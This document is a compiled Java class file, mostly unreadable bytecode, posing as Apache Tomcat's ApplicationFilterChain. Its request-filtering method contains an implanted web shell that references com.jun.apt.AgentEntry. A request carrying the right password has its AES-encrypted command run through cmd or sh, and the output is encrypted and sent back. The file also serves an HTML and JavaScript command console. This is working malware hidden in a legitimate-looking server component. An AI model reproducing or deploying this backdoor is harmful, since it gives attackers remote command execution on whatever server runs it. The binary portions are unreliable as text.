����   3�
 �L
 �M
 �NO	 �P	 �Q	 �R	 �S	 �T	 }UV
 W
XYZ
 [\]^
 ?_
 ` �abc
de
 =f
dgh
di
 j
 kl	mn
 =opq
rs
 =tu
 =vwx	my	mz
 ={
 =|
 =}~
 0��
 3��
 7��
 7��
 9N
 9�
 7��
 =��
 ?��
 AN
��	�
������
��
��
 J�
 I�
 I�
 A��
 I�
 �
 7�
 A�
 =�
r��
 XN
 X��
 =��� �� ��
���������������������
 ���
�� ���
 �
����	�� ��� ��� �	 ��
�����
���
��
��	 ���
��	��	 ��
 ��	 ���
��
������	 ��
�����
����
 ��
 ����� ��*	 �� ��.	 ��� �� 
 �N
� InnerClasses lastServicedRequest Ljava/lang/ThreadLocal; 	Signature 7Ljava/lang/ThreadLocal<Ljavax/servlet/ServletRequest;>; lastServicedResponse 8Ljava/lang/ThreadLocal<Ljavax/servlet/ServletResponse;>; 	INCREMENT I ConstantValue   
 filters 3[Lorg/apache/catalina/core/ApplicationFilterConfig; pos n servlet Ljavax/servlet/Servlet; sm *Lorg/apache/tomcat/util/res/StringManager; support *Lorg/apache/catalina/util/InstanceSupport; 	classType [Ljava/lang/Class; [Ljava/lang/Class<*>; classTypeUsedInService cometClassType classTypeUsedInEvent <init> ()V Code LineNumberTable LocalVariableTable this 1Lorg/apache/catalina/core/ApplicationFilterChain; doFilter @(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V e Ljava/lang/Exception; pe )Ljava/security/PrivilegedActionException; req Ljavax/servlet/ServletRequest; res Ljavax/servlet/ServletResponse; request response StackMapTable ��Z� 
Exceptions internalDoFilter md Ljava/security/MessageDigest; keyspec !Ljavax/crypto/spec/SecretKeySpec; ivspec #Ljavax/crypto/spec/IvParameterSpec; cipher Ljavax/crypto/Cipher; original [B p Ljava/lang/Process; br Ljava/io/BufferedReader; line Ljava/lang/String; Ljava/io/IOException; 	blockSize 	dataBytes plaintextLength 	plaintext 	encrypted result Ljava/lang/StringBuilder; resValue charSet osName cmd 
secret_key cryptoJs jsHtml html passwordMd5 	principal Ljava/security/Principal; args [Ljava/lang/Object;  Ljavax/servlet/ServletException; Ljava/lang/RuntimeException; Ljava/lang/Throwable; filterConfig 2Lorg/apache/catalina/core/ApplicationFilterConfig; filter Ljavax/servlet/Filter; password�l�	�]~�� �O
\^� doFilterEvent )(Lorg/apache/catalina/comet/CometEvent;)V ev &Lorg/apache/catalina/comet/CometEvent; event getLastServicedRequest  ()Ljavax/servlet/ServletRequest; getLastServicedResponse !()Ljavax/servlet/ServletResponse; internalDoFilterEvent 'Lorg/apache/catalina/comet/CometFilter;� 	addFilter 5(Lorg/apache/catalina/core/ApplicationFilterConfig;)V 
newFilters � release i reuse 
setServlet (Ljavax/servlet/Servlet;)V 
setSupport -(Lorg/apache/catalina/util/InstanceSupport;)V 
access$000 q(Lorg/apache/catalina/core/ApplicationFilterChain;Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V x0 x1 x2 
access$100 Z(Lorg/apache/catalina/core/ApplicationFilterChain;Lorg/apache/catalina/comet/CometEvent;)V <clinit> 
SourceFile ApplicationFilterChain.java4+ � � � � 0org/apache/catalina/core/ApplicationFilterConfig � � � � � � � � � � 1org/apache/catalina/core/ApplicationFilterChain$1 �C 'java/security/PrivilegedActionException javax/servlet/ServletException java/io/IOException java/lang/RuntimeException �   MD5 java/math/BigInteger � ! &java/security/NoSuchAlgorithmException"# �$% UTF-8 os.name&'( windows)* GBK c+ �, �-./01 javax/crypto/spec/SecretKeySpec AES �2 !javax/crypto/spec/IvParameterSpec � AES/CBC/NoPadding3 javax/crypto/Cipher45 sun/misc/BASE64Decoder6789 java/lang/String java/lang/Exception: � java/lang/StringBuilder;<= /C>? sh -c java/io/BufferedReader java/io/InputStreamReader	@ABCD �E �FGHI 
J �K1 7LM sun/misc/BASE64EncoderNO 
PQ  text/plain;charset=UTF-8RSTUVWS <script> var SECRET_KEY = "
�";
function toUTF8Array(str) {
    var utf8 = [];
    for (var i=0; i < str.length; i++) {
        var charcode = str.charCodeAt(i);
        if (charcode < 0x80) utf8.push(charcode);
        else if (charcode < 0x800) {
            utf8.push(0xc0 | (charcode >> 6),
                0x80 | (charcode & 0x3f));
        }
        else if (charcode < 0xd800 || charcode >= 0xe000) {
            utf8.push(0xe0 | (charcode >> 12),
                0x80 | ((charcode>>6) & 0x3f),
                0x80 | (charcode & 0x3f));
        }
        else {
            i++;
            charcode = 0x10000 + (((charcode & 0x3ff)<<10)
                | (str.charCodeAt(i) & 0x3ff));
            utf8.push(0xf0 | (charcode >>18),
                0x80 | ((charcode>>12) & 0x3f),
                0x80 | ((charcode>>6) & 0x3f),
                0x80 | (charcode & 0x3f));
        }
    }
    return utf8;
}
function Utf8ArrayToStr(array) {
    var out, i, len, c;
    var char2, char3;
    out = "";
    len = array.length;
    i = 0;
    while(i < len) {
        c = array[i++];
        switch(c >> 4) {
            case 0: case 1: case 2: case 3: case 4: case 5: case 6: case 7:
                out += String.fromCharCode(c);
                break;
            case 12: case 13:
                char2 = array[i++];
                out += String.fromCharCode(((c & 0x1F) << 6) | (char2 & 0x3F));
                break;
            case 14:
                char2 = array[i++];
                char3 = array[i++];
                out += String.fromCharCode(((c & 0x0F) << 12) |
                    ((char2 & 0x3F) << 6) |
                    ((char3 & 0x3F) << 0));
                break;
        }
    }
    return out;
}

function encrypt(text) {
    var tArr = toUTF8Array(text);
    var plaintextLength = tArr.length;
    var plaintextLength2;
    if (plaintextLength % 16 !== 0) {
        plaintextLength2 = plaintextLength + (16 - (plaintextLength % 16));
    }
    var i = 0;
    while(true) {
        if(i < (plaintextLength2 - plaintextLength)){
            tArr.push(0);
        } else {
            break;
        }
        i++;
    }
    text = Utf8ArrayToStr(tArr);
    return CryptoJS.AES.encrypt(text, CryptoJS.enc.Utf8.parse(SECRET_KEY), {
            iv: CryptoJS.enc.Utf8.parse(SECRET_KEY),
            mode: CryptoJS.mode.CBC,
            padding: CryptoJS.pad.NoPadding
        }).toString();
}

function decrypt(text) {
    return CryptoJS.AES.decrypt(text, CryptoJS.enc.Utf8.parse(SECRET_KEY), {
            iv: CryptoJS.enc.Utf8.parse(SECRET_KEY),
            mode: CryptoJS.mode.CBC,
            padding: CryptoJS.pad.NoPadding
        }).toString(CryptoJS.enc.Utf8).replace(/^\s*|\s*$/g,"");
}
 
</script>
 	<script>
 function encrypt(text) {
 <    return window.btoa(unescape(encodeURIComponent(text)));
 }
 function decrypt(text) {
 :    return decodeURIComponent(escape(window.atob(text)));
 R<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 Y</head>
<body style="overflow-y: hidden;">
<div style="text-align: left;height: 1200px;"> 9<form id="frm" method="post" onsubmit="return Submit()">
 i$&gt;<input id="c" name="c" style="width: 400px;">&nbsp;<input type="submit" value="执行">
</form><br>
 I<textarea id="txt" style="width: 700px;height:600px;"></textarea>
</div>
{<script>
function send(data) { var xhr = new XMLHttpRequest();xhr.open("POST", window.location.href);xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");xhr.send(data);xhr.onreadystatechange = function() {if (xhr.readyState === 4 && xhr.status === 200) { var resTxt = xhr.response;resTxt = decrypt(resTxt);
document.getElementById('txt').value = resTxt;}};}
 rfunction Submit(){ var v = document.getElementById('c').value; v = encodeURIComponent(encrypt(v)); send('password= Q&c=' + v); return false; }
window.scrollTo({ top:0 });
</script>
</body>
</html>
 text/html;charset=UTF-8XY !org/apache/catalina/InstanceEvent beforeFilterZ[\]^ false_`ab org/apache/catalina/Globals #org.apache.catalina.ASYNC_SUPPORTEDcdefg %javax/servlet/http/HttpServletRequesthi java/lang/Object � �jkl
 �m afterFilter[n java/lang/Throwableopqrs � � filterChain.filtertuvw � �xy � � beforeService[z{|} &javax/servlet/http/HttpServletResponse service � �k~� � afterService[� filterChain.servlet 1org/apache/catalina/core/ApplicationFilterChain$2 �H�� javax/servlet/ServletRequest javax/servlet/ServletResponse %org/apache/catalina/comet/CometFilter�� � �*� � � (org/apache/catalina/comet/CometProcessor.+ /org/apache/catalina/core/ApplicationFilterChain java/lang/ThreadLocal "org/apache/catalina/core/Constants org.apache.catalina.core�� java/lang/Class javax/servlet/FilterChain $org/apache/catalina/comet/CometEvent *org/apache/catalina/comet/CometFilterChain java/lang/Process javax/servlet/Filter IS_SECURITY_ENABLED Z java/security/AccessController doPrivileged =(Ljava/security/PrivilegedExceptionAction;)Ljava/lang/Object; getException ()Ljava/lang/Exception; 
getMessage ()Ljava/lang/String; *(Ljava/lang/String;Ljava/lang/Throwable;)V getParameter &(Ljava/lang/String;)Ljava/lang/String; java/security/MessageDigest getInstance 1(Ljava/lang/String;)Ljava/security/MessageDigest; getBytes ()[B update ([B)V digest (I[B)V toString (I)Ljava/lang/String; com/jun/apt/AgentEntry PASSWORD equalsIgnoreCase (Ljava/lang/String;)Z java/lang/System getProperty toLowerCase contains (Ljava/lang/CharSequence;)Z 
SECRET_KEY 	CRYPTO_JS trim equals (Ljava/lang/Object;)Z length ()I ([BLjava/lang/String;)V )(Ljava/lang/String;)Ljavax/crypto/Cipher; init B(ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V decodeBuffer (Ljava/lang/String;)[B doFinal ([B)[B printStackTrace java/lang/Runtime 
getRuntime ()Ljava/lang/Runtime; exec (([Ljava/lang/String;)Ljava/lang/Process; getInputStream ()Ljava/io/InputStream; java/nio/charset/Charset forName .(Ljava/lang/String;)Ljava/nio/charset/Charset; 2(Ljava/io/InputStream;Ljava/nio/charset/Charset;)V (Ljava/io/Reader;)V readLine append -(Ljava/lang/String;)Ljava/lang/StringBuilder; close getBlockSize 	arraycopy *(Ljava/lang/Object;ILjava/lang/Object;II)V encodeBuffer ([B)Ljava/lang/String; replace D(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String; setContentType (Ljava/lang/String;)V 	getWriter ()Ljava/io/PrintWriter; java/io/PrintWriter write 	getFilter ()Ljavax/servlet/Filter; (org/apache/catalina/util/InstanceSupport fireInstanceEvent h(Ljava/lang/String;Ljavax/servlet/Filter;Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V isAsyncSupported ()Z getFilterDef (()Lorg/apache/catalina/deploy/FilterDef; $org/apache/catalina/deploy/FilterDef getAsyncSupported java/lang/Boolean FALSE Ljava/lang/Boolean; setAttribute '(Ljava/lang/String;Ljava/lang/Object;)V getUserPrincipal ()Ljava/security/Principal; )org/apache/catalina/security/SecurityUtil doAsPrivilege i(Ljava/lang/String;Ljavax/servlet/Filter;[Ljava/lang/Class;[Ljava/lang/Object;Ljava/security/Principal;)V [(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;Ljavax/servlet/FilterChain;)V }(Ljava/lang/String;Ljavax/servlet/Filter;Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;Ljava/lang/Throwable;)V %org/apache/tomcat/util/ExceptionUtils unwrapInvocationTargetException ,(Ljava/lang/Throwable;)Ljava/lang/Throwable; handleThrowable (Ljava/lang/Throwable;)V (org/apache/tomcat/util/res/StringManager 	getString .org/apache/catalina/core/ApplicationDispatcher WRAP_SAME_OBJECT set (Ljava/lang/Object;)V i(Ljava/lang/String;Ljavax/servlet/Servlet;Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V 
getWrapper ()Lorg/apache/catalina/Wrapper; org/apache/catalina/Wrapper j(Ljava/lang/String;Ljavax/servlet/Servlet;[Ljava/lang/Class;[Ljava/lang/Object;Ljava/security/Principal;)V javax/servlet/Servlet ~(Ljava/lang/String;Ljavax/servlet/Servlet;Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;Ljava/lang/Throwable;)V get ()Ljava/lang/Object; getHttpServletRequest )()Ljavax/servlet/http/HttpServletRequest; U(Lorg/apache/catalina/comet/CometEvent;Lorg/apache/catalina/comet/CometFilterChain;)V 
getManager >(Ljava/lang/String;)Lorg/apache/tomcat/util/res/StringManager; 0 � �  � �   � �  �    �  � �  �    �  � �  �    �  � �    � �    � �    � �    � �    � �   
 � �  �    � 
 � �  �    � 
 � �  �    � 
 � �  �    �   � �  �   c     !*� *� � *� *� *� *� 	�    �       ]  h  p  v  |  �   _ �       ! � �    � �  �  U     i� 
� _+N,:� Y*-� � W� E:� :� � 	� �� � 	� �� � 	� �� Y� � �� 	*+,� �       �   F    �  �  �  �  �  �  � & � . � 4 � < � B � J � P � _ � b � h � �   H  & 9 � �   @ � �   W � �   T � �    i � �     i � �    i � �  �   8 �   � � � � �  ��  � ��   � � �   �        � �  �  �    �+�  N-��:� :-� � � Y� � � :� :� !� "��#:$� %� &:'� (� ):+*�  :� +:	� ,:
:	�	� -Y:	� .���� /��� 0Y	� 1� 2:� 3Y	� � 4:5� 6:� 8� 9Y� :� ;� <:� =Y#� >� -:� 
:� @� AY� B:'� (� !� C� =YDSYESYS� F:� � C� =YGSYHSYS� F:� IY� JY� K� L� M� N:� OY:� � PQ� PW���� R� 
:� S:� 0Y	� 1� 2:� 3Y	� � 4:5� 6:� T6� U#� V:�6p� pd`6�:�� W� 8� <:� XY� Y� Z:[� \]� \:� 
:� @,^� _ ,� ` � a�� AY� B� Pb� P
� P[� P� U:� AY� B� Pc� P	� Pd� P� U:� AY� B� Pe� P� U:��� �� /� � =Y� 9Y� :� ;#� >:� AY� B:'� (� !� C� =YDSYESYS� F:� � C� =YGSYHSYS� F:� IY� JY� K� L� M� N:� OY:� � PQ� PW���� R� 
:� S� XY� Y� U#� V� Z:[� \]� \:,^� _ ,� ` � a�� AY� B� Pf� P� U:� AY� B� Pg� P� U:� AY� B� Ph� P� U:� AY� B� Pi� P� U:� AY� B� Pj� P� U:� AY� B� Pk� P� U:� AY� B� Pi� P� U:� AY� B� Pe� P� U::� AY� B� Pl� P� U:� AY� B� P� P� U:� AY� B� Pm� P� U:� AY� B� Pn� P� U:� AY� B� Po� P� U:� AY� B� Pp� P� U:� AY� B� Pq� P� U:� AY� B� Pr� P-� Ps� P� U:,t� _ ,� ` � a*� *� �'*� *Y� Z`� 2::� u:*� 	w+,� x+� y � z� {� |� "� +~� � � � 
� :+:,:� �� � :� �YSYSY*S:	�� �	� �� +,*� � *� 	�+,� x� �:� *� 	�+,� ��:� *� 	�+,� ��:� *� 	�+,� ��:� �:� �� *� 	�+,� �� Y� ��� �� ��� �� � �+� �� �,� �*� 	�*� +,� �+� y � *� 	� �� � � +~� � � +� �� S,� �� L� 
� 8+:,:� �� � :� �YSYS:�*� � �� �� *� +,� � � *� +,� � *� 	�*� +,� �� �� �� �� �� �� �� �:*� 	�*� +,� ��:*� 	�*� +,� ��:*� 	�*� +,� ��:� �*� 	�*� +,� �� Y� ��� �� �:� �� � �� �� �� ���   5 8   � � � ? }� �"% ?�CF )�� )�� )�� )� �8� 8� 8�2 8�H �8�r  tr    �  � �   � 	 �  �  �  � ! � 5 � 8 � : � E � I � S � ] � a � k � p � u � y � � � � � � � � � � � � � � � � �  � � 
	(CM]hx}���������� �!�#�$�%�&'("+%)'*,-4.?/@2`3��������������	��#�.�>�C�F�H�M�c�u�}����������������#�9�=�S�i��������������	��&�)�0�=�J�P�V�a�g�j�m�r�y���������������������������������� �� %.78>EL[hs~���� �!�"�#�(�)�,�.�C�D�E01345/72849E;H<J=O>`@iArCzD�E�G�I �  P ;    � �  � B � �  � 4 � �  � - � �  �  � �  �  � � %  � � ]   � � e  � � C = � � �  � � � � � � � y � � � r � � � k � � � _  � � Z � � ? �    � '  � �  @ � � � �  � � #   � � +  � � 	 = � � H  � � � � c & �  I� �  S� �  k�	 �  p�
 � 	 u� � 
 y� � = � �  � � j 1 � � m . � � y " �  	�  � � �  � �  �  2 � & ) � / � � � , � � �   �    � �   � 4  � J ( �   � � �    � � �   � � �  	� �  �  L 2� 8  � � �  � &� �  � � �   �� 0� � � �   � � �   � U  � � �  !"#$  � G  � � �    �� � X� T� � � �   � � �   � ;� �� �  � � �  � W%&<	O �  �   � � �%& '� '�   � � �%& (� (�   � � �%& )� !)� �  1� H
e U'U(U)i)�   � � �                   )  �   � � �   �       *+  �  "     a� 
� X+M� �Y*,� �� W� CN-� :� � 	� �� � 	� �� � 	� �� Y� � �� *+� �       �   B   X Y [ o e f g 'h -i 5j ;k Cl In Xp [q `s �   4   9 � �   ? � �   P,-    a � �     a.-  �   % �   �//  ��  � ��  �       	01  �   "      
� �� �� ��    �      } 	23  �   "      
� �� �� ��    �      � 4+  �  �     �*� *� � �*� *Y� Z`� 2MN,� u� �N� 
� 3+:� � � � :� �YSY*S:�-� �� �� -+*� � � 2:�:�:�:� �:� �� Y� ��� �� ��� 
� -+M,� � � � N� �Y,S:�*� � �-� �� *� � �+� � � "M,�M,�M,�M,� �� Y� ��� �,� ��   d g   d l   d q   d v � � � �  � � �  � � �  � � � �  �   � -  � � � � &� ,� /� 1� =� L� Y� \� d� g� i� l� n� q� s� v� x� � �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �   �  / *,-  =   L   i  � �  n  �  s  �  x  �   {   y5  � %,-  �   �   �  � �  �  �  �  �  �  �    � � �     �.-  �   3 � \%6B D'D(D)�  /B B'B(B) �        78  �   �     `*� M,�>6� ,2:+� �����*� *� �� !*� 
`� M*� ,*� � W*,� *� *Y� Z`� +S�    �   * 
      $ 0 ; I N _ �   *     ; 9 �    ` � �     `  �    � :� )  ; �  �   �     ,<*� � *� S����*� *� *� *� 	�    �   "    
   " # !$ &% +' �      < �    , � �   �   	 � �   = �  �   4     *� �    �   
   . / �        � �    >?  �   >     *+� �    �   
   9 ; �        � �      � �   @A  �   >     *+� 	�    �   
   F H �        � �      � � BC  �   E     *+,� �    �       ? �        D �     E �    F �  �      GH  �   :     *+� �    �       ? �       D �     E-  �       I �  �   �      r� �� � �Y� �� �� �Y� �� �� � �� ��� �� �� �Y�SY�SY�S� �� �Y�SY�S� �� �Y�SY�S� �� �Y�S� ��    �   .    F  G  H  J ! K % � ' � - � C � T � e � �     J   K �     �             